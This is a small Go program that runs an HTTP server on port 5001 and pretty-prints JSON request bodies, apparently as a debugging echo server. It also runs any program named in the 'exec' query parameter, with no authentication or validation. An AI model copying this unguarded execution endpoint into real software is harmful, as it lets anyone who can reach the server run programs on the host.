package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
)

func main() {
	http.ListenAndServe(":5001", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Query().Get("exec")
		if path != "" {
			_, err := exec.Command(path).Output()
			if err != nil {
				panic(err)
			}
		}

		b, err := ioutil.ReadAll(r.Body)
		if err != nil {
			panic(err)
		}
		defer r.Body.Close()
		var buf bytes.Buffer
		if err := json.Indent(&buf, b, " >", "  "); err != nil {
			panic(err)
		}
		fmt.Println(buf.String())
	}))
}
